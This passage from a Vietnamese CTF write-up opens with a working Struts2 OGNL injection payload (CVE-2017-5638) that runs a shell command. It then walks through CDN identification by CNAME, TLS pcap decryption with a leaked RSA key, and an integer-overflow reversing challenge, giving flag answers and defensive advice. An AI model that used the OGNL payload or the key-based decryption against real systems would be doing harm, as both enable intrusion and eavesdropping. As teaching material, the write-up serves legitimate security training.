  -H "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /flag*').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

### (j) Bối cảnh lịch sử & phòng thủ
- CVE-2017-5638 (S2-045/046) chính là lỗ hổng gây ra **vụ rò rỉ dữ liệu Equifax 2017** (hơn 140
  triệu hồ sơ) — một trong những vụ lớn nhất lịch sử, do không vá Struts2 kịp.
- **Vì sao tool báo lỗi chunked nhưng vẫn ra flag:** payload ghi thẳng output lệnh vào output stream
  của response *trước khi* Struts2 hoàn tất đóng khung HTTP chuẩn, khiến phần chunked-encoding bị
  hỏng; client (struts-pwn) than phiền nhưng vẫn nhận được các byte output chứa flag.
- **Phòng thủ:** nâng cấp Struts2 ≥ 2.3.32 / 2.5.10.1; đặt WAF chặn `%{` và `multipart` dị dạng;
  nguyên tắc chung: không bao giờ evaluate dữ liệu người dùng như biểu thức.

---

## 4. Nhận diện nhà cung cấp CDN

### (a) Đề bài & metadata
- **Tên:** Nhận diện CDN
- **Category:** OSINT / Network reconnaissance
- **Nhiệm vụ:** cho host `jpn.nec.com`, xác định **nhà cung cấp CDN** nào đang phục vụ nó.
- **File đính kèm:** không có.

### (b) Kiến thức nền

**CDN (Content Delivery Network)** là mạng lưới nhiều máy chủ "biên" (edge) đặt rải rác khắp thế
giới, giữ bản sao nội dung (ảnh, CSS, video...) để phục vụ người dùng từ điểm *gần nhất* → nhanh
hơn, chịu tải tốt hơn, chống DDoS. Các nhà cung cấp lớn: **Akamai, Cloudflare, Fastly, Amazon
CloudFront, Google Cloud CDN...**

**DNS & bản ghi CNAME.** DNS dịch tên miền → IP. Một **CNAME** (Canonical Name) là *bí danh*: tên A
trỏ sang tên B. Khi một site dùng CDN, tên miền của họ thường CNAME tới tên miền của CDN. Ví dụ
`www.example.com` → CNAME → `example.com.edgekey.net` (Akamai). Nhìn cái "đuôi" domain đích là đoán
được CDN:
- `*.akamaiedge.net`, `*.akamai.net`, `*.edgekey.net`, `*.edgesuite.net` → **Akamai**
- `*.cloudfront.net` → Amazon
- `*.fastly.net` → Fastly
- Cloudflare thường không lộ qua CNAME mà qua dải IP / header.

### (c) Trinh sát & (d) phân tích
```bash
ping jpn.nec.com
# PING e13694.b.akamaiedge.net (125.252.231.135) ...
```
Khi `ping`, hệ thống phân giải DNS trước. Kết quả cho thấy `jpn.nec.com` **CNAME tới**
`e13694.b.akamaiedge.net`, IP `125.252.231.135`. Đuôi `akamaiedge.net` ⇒ **Akamai**.

Có thể xác nhận rõ chuỗi CNAME bằng:
```bash
dig +short jpn.nec.com
# jpn.nec.com.edgekey.net.
# e13694.b.akamaiedge.net.
# 125.252.231.135
nslookup jpn.nec.com
```

### (e)/(f) Flag
```
flag{akamai}
```

### (g) Cạm bẫy & cách khác
- Nếu chỉ nhìn IP có thể nhầm; nên tra **CNAME**. Công cụ online: `dnschecker`, `whatcdn`,
  `builtwith`, hoặc xem header `X-Cache`, `X-Akamai-*`, `Via:` trong response HTTP.
- Kết quả DNS có thể khác theo vị trí địa lý (CDN trả IP gần bạn nhất) nhưng đuôi CNAME thì nhất quán.

### (h) Tham khảo
- Tài liệu Akamai về CNAME/edge hostnames; công cụ `dig`, `nslookup`, `host`.

### (i) Đào sâu: CDN hoạt động thế nào & cách nhận diện chắc chắn
**Cơ chế phân phối.** Khi bạn mở `jpn.nec.com`, DNS trả về IP của một *edge server* Akamai gần bạn.
Edge server kiểm tra cache: nếu có nội dung → trả ngay; nếu chưa → lấy từ *origin* (máy chủ gốc của
NEC) rồi lưu cache cho lần sau. Nhờ vậy người dùng ở Nhật, Việt Nam, Mỹ... đều được phục vụ từ điểm
gần nhất.

**Anycast.** Nhiều CDN (nhất là Cloudflare) dùng *anycast*: cùng một dải IP được "quảng bá" (BGP) từ
hàng trăm điểm trên thế giới; gói tin của bạn tự động tới điểm gần nhất theo định tuyến. Vì vậy cùng
một IP nhưng mỗi nơi lại chạm một máy vật lý khác.

**Các cách nhận diện CDN (nên chéo nhiều cách):**
1. **CNAME** (chắc nhất): `dig +short CNAME jpn.nec.com` → đuôi `edgekey.net`/`akamaiedge.net`.
2. **Header HTTP:** `curl -sI https://jpn.nec.com` xem `Server:`, `X-Cache:`, `X-Akamai-*`, `Via:`.
   Akamai hay để `X-Cache: TCP_HIT from ...`, `Server: AkamaiGHost`.
3. **Dải IP / ASN:** tra IP `125.252.231.135` bằng `whois` → thuộc AS của Akamai.
4. **Công cụ:** `builtwith.com`, `whatcdn`, `cdnplanet`, extension Wappalyzer.

**Bảng đuôi CNAME → CDN (tham khảo nhanh):**
| Đuôi CNAME | CDN |
|------------|-----|
| akamaiedge.net, akamai.net, edgekey.net, edgesuite.net | Akamai |
| cloudfront.net | Amazon CloudFront |
| fastly.net, fastlylb.net | Fastly |
| cdn.cloudflare.net | Cloudflare |
| azureedge.net | Microsoft Azure CDN |
| cdngc.net, gccdn.net | CDNetworks |

---

## 5. Giải mã phiên TLS từ pcap

### (a) Đề bài & metadata
- **Tên:** Giải mã phiên TLS
- **Category:** Forensics — **giải mã phiên TLS** từ bản bắt gói
- **File đính kèm:** `D5-tls-capture/64ef3b043d56cbbb8f873cfa96cd3e4e.zip` (1 827 616 byte,
  MD5 `64ef3b043d56cbbb8f873cfa96cd3e4e`).
- **Nội dung zip (đã kiểm tra):** một bản sao cây thư mục `/etc` của server CentOS, gồm:
  - `etc/httpd/conf/httpd.conf`, `etc/httpd/conf.d/ssl.conf` (cấu hình Apache)
  - `etc/pki/tls/certs/server.crt`, `server.csr`, **`server.key`** (chứng chỉ + **khoá riêng**)
  - `etc/pki/tls/certs/localhost.crt`, `etc/pki/tls/private/localhost.key`
  - các CSDL khoá NSS: `etc/pki/nssdb/{cert8.db,cert9.db,key3.db,key4.db,secmod.db}`
  - **`unlock.pcapng`** (7 380 byte) — bản bắt gói
- **Mục tiêu:** đọc flag mà server trả về qua **HTTPS**.

### (b) Kiến thức nền

**TLS/HTTPS** mã hoá nội dung HTTP nên trong pcap ta chỉ thấy byte rối. Muốn đọc phải *giải mã*.

**Bắt tay TLS & trao khoá.** Khi client–server bắt tay, hai bên thống nhất một *session key* (khoá
đối xứng) để mã hoá dữ liệu. Cách thống nhất session key gọi là *key exchange*:
- **RSA key exchange (kRSA):** client sinh "pre-master secret", **mã hoá bằng khoá công khai của
  server**, gửi đi. Server dùng **private key** giải ra pre-master → từ đó cả hai tính session key.
  → **Ai có private key của server thì giải mã được toàn bộ phiên** (kể cả bắt gói sau này).
- **ECDHE (Diffie-Hellman trên đường cong elliptic):** session key sinh ra qua trao đổi tạm thời,
  **không** truyền trực tiếp. Có *forward secrecy*: dù lộ private key sau này cũng **không** giải mã
  được phiên cũ. Khi đó cần *SSLKEYLOGFILE* (pre-master secret log) chứ private key là vô dụng.

**Điểm mấu chốt đã kiểm chứng trong đề:** file `ssl.conf` ép:
```apache
<VirtualHost _default_:443>
  SSLProtocol all -SSLv2
  SSLCipherSuite kRSA                         # <-- CHỈ cho dùng trao khoá RSA
  SSLCertificateFile    /etc/pki/tls/certs/server.crt
  SSLCertificateKeyFile /etc/pki/tls/certs/server.key
</VirtualHost>
```
`SSLCipherSuite kRSA` buộc server **chỉ** dùng bộ mã trao khoá RSA ⇒ **không có forward secrecy** ⇒
đưa `server.key` vào Wireshark là **giải mã được**. Đây chính là lý do gốc rễ khiến bài giải được
(mô tả phổ biến không nêu chi tiết dòng này — xem mục Đính chính 0.4).

Thông tin `server.crt` (đã kiểm chứng bằng `openssl x509`):
- Subject/Issuer: `C=XX, L=Default City, O=Default Company Ltd` (self-signed, chứng chỉ mặc định)
- Hiệu lực: 13/12/2018 → 10/12/2028
- `server.key`: **RSA PRIVATE KEY, 2048-bit** (`-----BEGIN RSA PRIVATE KEY-----`).

### (c) Trinh sát ban đầu
```bash
unzip -l 64ef3b043d56cbbb8f873cfa96cd3e4e.zip         # liệt kê nội dung
find etc | grep -iE 'key|crt'                          # tìm khoá & chứng chỉ
# → server.key, localhost.key, key3.db, key4.db, server.crt ...
```
Mở `unlock.pcapng` trong **Wireshark** → *Statistics → Protocol Hierarchy*: có cả **HTTP** (rõ) và
**TLS** (mã hoá).

### (d) Phân tích từng bước (reasoning)
1. *Follow HTTP Stream* kênh HTTP (cổng 80) — kiểm chứng bằng `strings unlock.pcapng`:
   ```
   GET /flag.txt HTTP/1.1
   User-Agent: Wget/1.17.1 (linux-gnu)
   Host: 192.168.1.111
   HTTP/1.1 302 Found
   Server: Apache/2.2.15 (CentOS)
   Location: https://192.168.1.111/flag.txt
   ```
   Tức: client `wget` xin `/flag.txt` qua HTTP, server **chuyển hướng 302** sang **HTTPS**. Nội dung
   flag nằm ở phiên HTTPS — và phiên này *không* xuất hiện dạng chữ trong `strings` (vì đã mã hoá).
2. *Vì sao đề cho sẵn private key?* Đó là gợi ý trắng trợn: "giải mã TLS đi". Kết hợp với `kRSA` ở
   `ssl.conf` ⇒ chiến lược rõ ràng.
3. Hướng dễ sai: cố tìm flag bằng `strings` trên phần TLS (vô ích vì đã mã hoá); hoặc loay hoay với
   `key3.db/key4.db` của NSS (đó là keystore của trình duyệt/NSS, không cần ở đây).

### (e) Lời giải chi tiết
Trong Wireshark: **Edit → Preferences → Protocols → TLS → RSA keys list → +**, thêm một mục:

| Trường | Giá trị |
|--------|---------|
| IP address | `192.168.1.111` |
| Port | `443` |
| Protocol | `http` |
| Key File | `etc/pki/tls/certs/server.key` |
| Password | (để trống) |

Sau khi thêm, Wireshark dùng private key RSA giải pre-master secret trong gói *ClientKeyExchange* →
tính session key → giải mã toàn bộ phiên. Giờ *Follow HTTP Stream* cho phiên HTTPS:
```
GET /flag.txt HTTP/1.1
Host: 192.168.1.111
...
HTTP/1.1 200 OK
...
flag{cf8236571e9dd3bcaf44b188bba4f15d}
```
(Cách dòng lệnh tương đương: `tshark -r unlock.pcapng -o "tls.keys_list:192.168.1.111,443,http,server.key" -z follow,http,...`.)

### (f) Flag & ý nghĩa
```
flag{cf8236571e9dd3bcaf44b188bba4f15d}
```
Bài học lớn: **RSA key exchange không có forward secrecy** — chỉ cần lộ private key là mọi phiên
(kể cả đã bắt từ trước) đều giải mã được. Đây là lý do thực tế người ta chuyển sang ECDHE.


### (g) Cạm bẫy & cách khác
- Nếu phiên dùng **ECDHE**, private key **không** giải mã được — khi đó phải có `SSLKEYLOGFILE`.
  Đề này cố tình đặt `kRSA` để private key hiệu quả.
- Phải nhập đúng IP/port của server (`192.168.1.111:443`). Nhập sai Wireshark sẽ không áp key.
- Nhớ dùng đúng `server.key` (của vhost 443), không phải `localhost.key`.

### (h) Tham khảo
- Wireshark Wiki — "TLS decryption"; `SSLCipherSuite` trong `mod_ssl` của Apache.

### (i) Đào sâu: bắt tay TLS 1.2 với RSA key exchange (từng gói)
Để hiểu *vì sao* private key giải mã được, hãy xem trình tự gói trong một phiên TLS 1.2 dùng kRSA
(đúng kiểu phiên trong `unlock.pcapng`):

1. **ClientHello** (client → server): gửi danh sách cipher suite client hỗ trợ + một số ngẫu nhiên
   `client_random`.
2. **ServerHello** (server → client): chọn cipher suite (ở đây là bộ `TLS_RSA_WITH_...`), gửi
   `server_random`.
3. **Certificate**: server gửi `server.crt` (chứa **khoá công khai** RSA 2048-bit).
4. **ClientKeyExchange** (client → server): client sinh **pre-master secret** (48 byte ngẫu nhiên),
   **mã hoá bằng khoá công khai** trong cert, gửi đi. ← *Đây là mắt xích vàng.*
5. Hai bên tính **master secret** = PRF(`pre_master`, `client_random`, `server_random`), từ đó dẫn
   ra các **session key** (khoá mã hoá đối xứng + khoá MAC).
6. **Finished** + dữ liệu ứng dụng: được mã hoá đối xứng bằng session key.

Khi ta nạp **`server.key`** vào Wireshark:
- Wireshark lấy gói ClientKeyExchange ở bước (4), dùng private key **giải mã** để lấy lại
  `pre_master_secret`.
- Có `pre_master` + `client_random` + `server_random` (đều nằm trong các gói Hello, không mã hoá) →
  Wireshark tự tính master secret → session key → **giải mã toàn bộ** dữ liệu ứng dụng (bước 6),
  lộ ra `HTTP/1.1 200 OK ... flag{...}`.

**Vì sao ECDHE thì KHÔNG được:** với ECDHE, bước (4) không truyền pre-master; thay vào đó hai bên
trao *public ephemeral key* và tự tính chung secret qua Diffie–Hellman. Secret này **không bao giờ
lên dây**, và khoá ephemeral bị vứt sau phiên → có private key của server cũng chẳng suy ra được
(đó là *forward secrecy*). Đề đã khéo đặt `SSLCipherSuite kRSA` để loại ECDHE, khiến private key trở
nên hữu dụng.

### (j) Vì sao các file NSS (`key3.db`, `key4.db`) là "mồi nhử"
`etc/pki/nssdb/` chứa keystore của thư viện NSS (Firefox/Thunderbird dùng). Chúng lưu khoá/chứng chỉ
của *client*, không liên quan tới việc giải mã phiên của *server*. Người mới dễ mất thời gian cố mở
`key3.db`/`key4.db` bằng `certutil`/`pk12util`. Bài này chỉ cần đúng `server.key`.

### (k) Góc phòng thủ
- Luôn ưu tiên bộ mã **ECDHE** (forward secrecy); không ép `kRSA`.
- Bảo vệ private key tuyệt đối: lộ key = lộ mọi phiên RSA đã/đang bắt được.
- Nếu cần debug TLS hợp pháp, dùng `SSLKEYLOGFILE` (chỉ áp cho máy mình), không chia sẻ private key.

---

## 6. Tràn số nguyên (Integer Overflow)

### (a) Đề bài & metadata
- **Tên:** Tràn số nguyên (chủ đề *modulo* — phép chia lấy dư)
- **Category:** Reverse Engineering — **Integer Overflow** (tràn số nguyên)
- **File đính kèm:**
  - `D6-integer-overflow/binary_e2b191e6b2bb80471d8c4cdb96002207.zip` → giải nén ra `binary_...e2b191e6....exe`
    (PE Windows, **19 456 byte**).
  - `D6-integer-overflow/source_b8848652bef5d195b8d98fe880057d73.cp` (**2 554 byte**, UTF-16LE) — **mã nguồn C++**
    nhưng nhánh in flag bị thay bằng `<<Deleted>>`.
- **Mô tả:** chương trình hỏi một số rồi báo **chẵn/lẻ**. Flag nằm trong nhánh đã bị xoá của hàm
  `GetFlag`, chỉ chạy khi input thoả điều kiện đặc biệt.

### (b) Kiến thức nền

**Số nguyên có dấu 32-bit (`int`).** Trong C/C++, `int` thường rộng 32 bit, biểu diễn theo **bù hai
(two's complement)**. Dải giá trị: từ **-2 147 483 648** (`0x80000000`) đến **+2 147 483 647**
(`0x7FFFFFFF`). Bit cao nhất (bit 31) là *bit dấu*: 0 = dương, 1 = âm.

**Integer overflow (tràn số).** Nếu kết quả phép tính vượt ngoài dải trên, giá trị bị "cuộn vòng"
(wrap-around) theo modulo 2³² = 4 294 967 296. Ví dụ `0x7FFFFFFF + 1 = 0x80000000`, mà
`0x80000000` diễn giải theo bù hai là **-2 147 483 648**. Số dương lớn nhất +1 → nhảy sang số âm
nhỏ nhất. Đây là nguồn của vô số bug an ninh.

**Phép `%` (modulo) với số âm trong C/C++.** Chuẩn C quy định `%` **giữ dấu của số bị chia**. Do đó:
- `4 % 2 == 0`, `5 % 2 == 1` (số dương: dư 0 hoặc 1).
- `-3 % 2 == -1`, `-7 % 2 == -1` (số **âm lẻ**: dư **-1**, KHÔNG phải 1!).
Điểm này là chìa khoá của bài.

### (c) Trinh sát ban đầu
```bash
file binary_...e2b191e6....exe      # PE32 executable (console) Intel 80386, for MS Windows
# Đọc chuỗi tĩnh trong exe (KHÔNG chạy):
strings -n 5 binary_...e2b191e6....exe | grep -iE 'even|odd|Close|number|limit'
```
Kết quả `strings` xác nhận các câu thông báo:
```
Determine whether the number you entered is even or odd.
Input number, please
Input number only.
Close! Please enter close to the limit value to get a flag.
The number you input is even.
The number you input is odd.
```
**Quan trọng:** chuỗi flag **không** xuất hiện trong `strings` — tức flag *không* nằm cứng trong
binary mà được **dựng/giải ở runtime** trong nhánh `<<Deleted>>`. Vì vậy ta phải suy luận điều kiện,
không thể chỉ `strings` ra flag.

### (d) Phân tích mã nguồn & reasoning
Mã nguồn `.cp` (đã chuyển từ UTF-16 sang đọc được), phần cốt lõi:
```cpp
int InputNumber() {
    char innum[11] = "";               // buffer 11 byte -> tối đa 10 chữ số
    int num; bool f;
    while (true) {
        num = 0; f = false;
        cin >> innum;                  // đọc chuỗi người dùng nhập
        for (int i = 0; i < sizeof(innum); i++) {
            if (innum[i] > 0) {
                if (!(innum[i] >= '0' && innum[i] <= '9')) {   // chỉ nhận ký tự số
                    cout << "Input number only."; f = false; break;
                } else {
                    int j = innum[i] - '0';
                    num = num * 10 + j;        // dựng số: KHÔNG kiểm tra tràn!
                    f = true;
                }
            }
        }
        if (f == true) return num;      // trả về int (có thể đã tràn thành âm)
    }
}

std::string GetFlag(int key) {
    std::string val = "";
    if (key * 2 == 2) {       // điều kiện mở khoá
        <<Deleted>>           // <-- nhánh in flag, bị xoá khỏi đề
    } else {
        val = "Close! Please enter close to the limit value to get a flag.";
    }
    return val.c_str();
}

int main() {
    int num = InputNumber();
    std::string msg;
    if (num % 2 == 0)       msg = "The number you input is even.\n";
    else if (num % 2 == 1)  msg = "The number you input is odd.\n";
    else                    msg = GetFlag(num);   // CHỈ tới đây khi num%2 khác 0 VÀ khác 1
    printf("%s\n", msg.c_str());
}
```

**Suy luận điều kiện để lấy flag — 3 ràng buộc:**

1. **Chạm được `GetFlag`:** cần `num % 2` khác 0 *và* khác 1. Với số dương, `%2` chỉ ra 0 hoặc 1 →
   không bao giờ rơi vào `else`. Khả năng duy nhất còn lại: `num % 2 == -1`, xảy ra khi **`num` là
   số âm lẻ** (do quy tắc `%` giữ dấu số bị chia). ⇒ ta cần `num` **âm và lẻ**.

2. **Không nhập trực tiếp số âm được:** `InputNumber` chỉ nhận ký tự `'0'..'9'`, loại dấu `-`. Vậy
   làm sao có `num` âm? → nhờ **integer overflow**: nhập một số dương *đủ lớn* để khi dựng vào `int`
   32-bit nó cuộn vòng thành **âm**.

3. **Qua được `if (key * 2 == 2)` trong GetFlag:** sau khi nhân đôi (cũng là phép trên `int` 32-bit,
   có thể tràn), kết quả phải đúng bằng `2`.

**Tìm giá trị thoả cả 3:** Đặt `N` là số ta nhập (được lưu vào `int`).
- Cần `N*2 ≡ 2 (mod 2³²)` ⇒ `N ≡ 1 (mod 2³¹)`. Hai ứng viên nhỏ: `N = 1` (nhưng 1 là lẻ dương →
  rơi vào nhánh "odd", loại) và `N = 2³¹ + 1 = 2147483649` (`0x80000001`).
- Với `N = 2147483649`: khi lưu vào `int` 32-bit, `0x80000001` có bit dấu = 1 ⇒ giá trị thực là
  **-2147483647** → **âm & lẻ** ✓ (ràng buộc 1 & 2).
- `key * 2` = `(-2147483647) * 2` = `-4294967294`; theo mod 2³² = `0x0000000000000002` cắt 32-bit →
  **2** ✓ (ràng buộc 3). (Tính theo giá trị chưa dấu: `0x80000001 * 2 = 0x100000002` → cắt 32-bit =
  `0x00000002` = 2.)

**Kiểm chứng bằng Python (mô phỏng wrap 32-bit, không chạy exe):**
```python
import ctypes
N = 2147483649
print(ctypes.c_int32(N).value)        # -2147483647  (âm, lẻ -> num%2 == -1)
print((-2147483647) % 2)               # -1           (bỏ qua nhánh even/odd)
print(ctypes.c_int32(N * 2).value)     # 2            (thoả key*2 == 2)
```
Mô tả phổ biến tính `(0xffffffff + 3) / 2 = 2147483649` — ra cùng con số.

### (e) Lời giải
Chạy chương trình (trong tài liệu này chỉ *suy luận tĩnh*, không execute) và nhập:
```
2147483649
```
Nhờ tràn số, `num` thành `-2147483647` (âm lẻ) → `main` gọi `GetFlag(-2147483647)` → `key*2` cuộn
về `2` → điều kiện đúng → chương trình in flag.

### (f) Flag & ý nghĩa
```
flag{Something_happens_when_exceeds_limit_value}
```
Flag nói thẳng ý tưởng: "điều gì đó xảy ra khi vượt giá trị giới hạn" — chính là integer overflow.

### (g) Cạm bẫy & cách khác
- Nhầm `-3 % 2 == 1`: SAI trong C/C++ (đúng là `-1`). Nếu nghĩ nó bằng 1 sẽ bế tắc.
- Nhập `11` chữ số liên tục có thể vượt buffer; chỉ cần `2147483649` (10 chữ số) là đủ.
- Cách khác (không cần đoán): **patch** nhánh `if (num%2...)` hoặc đặt breakpoint trong debugger
  (x64dbg/Ghidra) sửa `key` = 1 ngay trước `GetFlag`. Nhưng phân tích tĩnh như trên là gọn nhất.
- Lưu ý *undefined behavior*: tràn `int` có dấu về mặt chuẩn C là UB; thực tế trình biên dịch MSVC
  cho hành vi wrap như mô tả, nên exploit hoạt động.

### (h) Tham khảo
- Chuẩn C/C++ về `%` (dấu kết quả) và two's complement.
- Công cụ phân tích tĩnh: Ghidra, IDA, `strings`, `file`.

### (i) Đào sâu: bù hai (two's complement) ở mức bit
Vì sao `0x80000001` lại là số âm? Trong *bù hai* 32-bit:
- Bit 31 (cao nhất) là **bit dấu**: 0 = dương, 1 = âm.
- Giá trị của một mẫu bit `b` khi coi là có dấu: nếu bit 31 = 1 thì giá trị = `b - 2^32`.

Xét `N = 2147483649 = 0x80000001 = 1000 0000 0000 0000 0000 0000 0000 0001₂`:
- Bit 31 = 1 ⇒ âm. Giá trị = `0x80000001 - 0x100000000` = `2147483649 - 4294967296` =
  **-2147483647**. ✓ (âm, và lẻ vì bit 0 = 1).

Phép nhân đôi `N*2` ở mức bit = dịch trái 1 bit:
```
  0x80000001 << 1 = 0x100000002   (33 bit)
  cắt còn 32 bit  = 0x00000002    = 2
```
Đúng điều kiện `key*2 == 2`. Bảng minh hoạ các mốc quan trọng của int32:
| Hex | Unsigned | Signed (bù hai) | Ghi chú |
|-----|----------|-----------------|---------|
| 0x7FFFFFFF | 2147483647 | +2147483647 | dương lớn nhất |
| 0x80000000 | 2147483648 | -2147483648 | âm nhỏ nhất (tràn) |
| 0x80000001 | 2147483649 | **-2147483647** | giá trị ta nhập |
| 0xFFFFFFFF | 4294967295 | -1 | tất cả bit 1 |

### (j) Góc nhìn mã máy (vì sao đọc source là đủ)
Khi biên dịch, `num % 2` với `int` có dấu thường được MSVC sinh ra lệnh kiểu `and`/`cdq+idiv` giữ
dấu, nên kết quả `-1` cho số âm lẻ đúng như lý thuyết. Nhánh `if/else if/else` trong `main` dịch
thành so sánh `== 0`, `== 1`, nếu đều trượt thì nhảy vào `GetFlag`. Vì logic đã lộ hết trong source,
ta không cần mở Ghidra; nhưng nếu muốn kiểm chứng, có thể xem hàm `GetFlag` trong disassembly để
thấy chuỗi flag được dựng động (giải thích vì sao `strings` không thấy flag).

### (k) Mô phỏng an toàn trọn vẹn (không chạy .exe)
```python
import ctypes
def simulate(s):
    # tái hiện InputNumber: dựng int32 từ các chữ số, cho phép tràn
    num = 0
    for ch in s:
        if not ch.isdigit():
            return None
        num = ctypes.c_int32(num * 10 + (ord(ch) - ord('0'))).value
    return num

n = simulate("2147483649")      # -> -2147483647
print("num =", n)               # âm, lẻ
print("num % 2 =", n % 2 if n>=0 else -( (-n)%2 ))  # C-style: -1
print("key*2 =", ctypes.c_int32(n*2).value)         # 2  -> mở khoá
```
Kết quả xác nhận toàn bộ chuỗi điều kiện mà không cần thực thi binary.

### (l) ĐỐI CHIẾU DISASSEMBLY THẬT từ `.exe` (tĩnh, dùng `objdump -d`)
Tôi đã giải nén `.exe` (PE32, i386, 5 sections, entry `0x00402a4a`) và disassemble **tĩnh** bằng
`objdump -d` (KHÔNG chạy). Ba hàm trong source C++ ánh xạ rõ ràng ra mã máy như sau.

**(1) `InputNumber()` — địa chỉ `0x401160`.** Vòng lặp dựng số:
```asm
4011e6:  mov    0x8(%esp,%eax,1),%bl      ; bl = innum[i]
4011ea:  test   %bl,%bl
4011ec:  jle    0x401204                  ; ký tự <= 0 -> bỏ qua
4011ee:  lea    -0x30(%ebx),%ecx          ; ecx = ch - '0'   (0x30='0')
4011f1:  cmp    $0x9,%cl
4011f4:  ja     0x401222                  ; nếu (unsigned)(ch-'0') > 9 -> "Input number only."
4011f6:  lea    (%esi,%esi,4),%esi        ; esi = num*5
4011f9:  movsbl %bl,%ecx                  ; ecx = ch (sign-extend)
4011fc:  lea    -0x18(%esi),%esi          ; esi = num*5 - 24
4011ff:  mov    $0x1,%bh                  ; f = true
401201:  lea    (%ecx,%esi,2),%esi        ; esi = ch + (num*5-24)*2 = num*10 + ch - 48
401204:  inc    %eax
401205:  cmp    $0xb,%eax                 ; lặp đủ 11 byte (sizeof innum)
401208:  jb     0x4011e6
```
Chú ý trình biên dịch gộp phép `num = num*10 + (ch - '0')` thành chuỗi `lea`: `(num*5 - 24)*2 + ch`
= `num*10 - 48 + ch` = `num*10 + (ch - 48)`. Đúng y hệt source, và **không có kiểm tra tràn** →
cho phép overflow. Kiểm tra `cmp $0x9,%cl` sau `ch-'0'` chính là điều kiện "chỉ nhận chữ số".

**(2) `main()` — phép `% 2` để chia nhánh even/odd/GetFlag (quanh `0x401878`).** Đây là bằng chứng
quan trọng nhất cho lời giải:
```asm
401878:  call   0x401160                  ; num = InputNumber()
40188f:  mov    %eax,%ecx                  ; ecx = num
401898:  and    $0x80000001,%ecx           ; ecx = num & 0x80000001  (giữ bit0 và bit dấu)
40189e:  jns    0x4018a7                    ; nếu kết quả KHÔNG âm -> bỏ qua fixup
4018a0:  dec    %ecx                        ; --- nhánh số âm: hiệu chỉnh ---
4018a1:  or     $0xfffffffe,%ecx
4018a4:  add    $0x1,%ecx                   ; với số âm lẻ -> ecx = -1
4018a7:  jne    0x4018ba                    ; ecx != 0 ? -> không phải "even"
4018a9:  push   $0x1e ; push $0x4042a0      ; "The number you input is even."
         ...
4018ba:  cmp    $0x1,%ecx                   ; ecx == 1 ?
4018bd:  jne    0x4018d0                    ; không -> nhảy tới GetFlag
4018bf:  push   $0x1d ; push $0x4042c0      ; "The number you input is odd."
         ...
4018d0:  mov    %eax,%edx                   ; edx = num  (tham số cho GetFlag)
4018d5:  call   0x401230                    ; GetFlag(num)
```
Trình biên dịch hiện thực `num % 2` cho `int` **có dấu** bằng mẹo `and $0x80000001` (giữ bit thấp
nhất + bit dấu) rồi hiệu chỉnh nếu âm. Lần vết cho input `2147483649` (lưu thành `num = -2147483647
= 0x80000001`):
- `0x80000001 & 0x80000001 = 0x80000001` (âm) → `jns` không nhảy → fixup: `dec`→`0x80000000`,
  `or 0xfffffffe`→`0xfffffffe`, `add 1`→`0xffffffff` = **-1**.
- `ecx=-1 ≠ 0` → không "even". `cmp $1`: `-1 ≠ 1` → **nhảy tới `0x4018d0` → gọi `GetFlag(num)`**.
→ Khớp hoàn hảo với suy luận "số âm lẻ có `%2 == -1` nên lọt qua cả hai nhánh".

**(3) `GetFlag(int key)` — điều kiện `key*2==2` (địa chỉ `0x401230`).**
```asm
40125d:  mov    %edx,-0x30(%ebp)            ; lưu key
40128c:  mov    -0x30(%ebp),%ecx            ; ecx = key
401292:  lea    (%ecx,%ecx,1),%eax          ; eax = key*2
401295:  cmp    $0x2,%eax                   ; key*2 == 2 ?
401298:  jne    0x4017b0                    ; không -> nhánh "Close! ..."
40129e:  movl   $0x8000003b,-0x1f0(%ebp)    ; === NHÁNH BÍ MẬT: dựng flag ===
4012a8:  movl   $0x15,-0x1ec(%ebp)
         ... (tổng cộng 96 dword = 48 cặp) ...
```
`lea (%ecx,%ecx,1)` = `key*2`; `cmp $0x2` + `jne` = đúng câu `if (key*2 == 2)` trong source. Với
`key = -2147483647`, `key*2` tràn 32-bit về `2` → điều kiện đúng → vào **nhánh `<<Deleted>>`**.

### (m) Vì sao `strings` không thấy flag — flag được DỰNG ở runtime
Nhánh bí mật **không** chứa chuỗi flag sẵn. Thay vào đó nó ghi **48 cặp số nguyên** (96 dword) lên
stack rồi lặp qua chúng, mỗi vòng gọi hàm trợ giúp số học 64-bit tại `0x4034f0`:
```asm
401664:  push   -0x1ec(%ebp,%esi,8)        ; phần "cao" của phần tử thứ esi
40166b:  push   -0x1f0(%ebp,%esi,8)        ; phần "thấp"  (bước nhảy = 8 byte = 1 cặp)
401672:  call   0x4034f0                    ; hàm 64-bit (kiểu _alldiv/_allrem của MSVC)
401677:  mov    %eax,-0x50(%ebp)            ; ghép ký tự vào std::string kết qul
         ...  (append từng ký tự vào chuỗi) ...
```
Hàm `0x4034f0` bắt đầu bằng đoạn xử lý dấu điển hình của thủ tục 64-bit có dấu:
```asm
4034f0:  push %ebx ; push %edi ; xor %edi,%edi
4034f4:  mov  0x10(%esp),%eax ; or %eax,%eax ; jge ...      ; kiểm tra & chuẩn hoá dấu
4034fc:  inc %edi ; neg %eax ; neg %edx ; sbb $0x0,%eax     ; lấy trị tuyệt đối 64-bit
```
Mảng dữ liệu (một phần, đọc trực tiếp từ các lệnh `movl`): `0x8000003b, 0x15, 0x5c, 0x08,
0x80000018, 0x24, 0x3f, 0x14, 0x71, 0x05, 0x4d, 0x03, 0x4d, 0x11, 0x0f, 0x2f, 0x43, ...` — 48 cặp
tất cả (khớp đúng **48 ký tự** của `flag{Something_happens_when_exceeds_limit_value}`). Các phần tử
có bit cao `0x80000000` chính là lý do hàm xử lý dấu ở `0x4034f0` tồn tại.

**Kết luận từ disassembly:** mã máy xác nhận tuyệt đối lời giải — flag chỉ hiện ra khi `key*2==2`
